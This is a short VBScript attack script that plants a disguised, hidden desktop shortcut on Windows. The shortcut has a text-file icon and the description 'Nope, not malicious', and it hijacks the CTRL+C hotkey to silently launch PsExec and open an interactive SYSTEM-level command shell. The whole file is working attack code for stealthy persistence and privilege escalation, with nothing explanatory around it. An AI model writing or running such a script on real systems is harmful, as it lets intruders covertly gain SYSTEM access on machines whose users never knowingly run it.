Set wshell = CreateObject("WScript.Shell")

Dim path
path = wshell.SpecialFolders("Desktop") & "/FakeText.lnk"

Set shortcut              = wshell.CreateShortcut(path)
shortcut.IconLocation     = "C:\Windows\System32\shell32.dll,70"
shortcut.WindowStyle      = 7
shortcut.TargetPath       = "cmd.exe"
shortcut.Arguments        = "/c C:\PsExec64.exe /accepteula -s -i cmd.exe"
shortcut.WorkingDirectory = "C:"
shortcut.HotKey           = "CTRL+C"
shortcut.Description      = "Nope, not malicious"
shortcut.Save

' Optional if we want to make the link invisible (prevent user clicks)
Set fso       = CreateObject("Scripting.FileSystemObject")
Set mf        = fso.GetFile(path)
mf.Attributes = 2
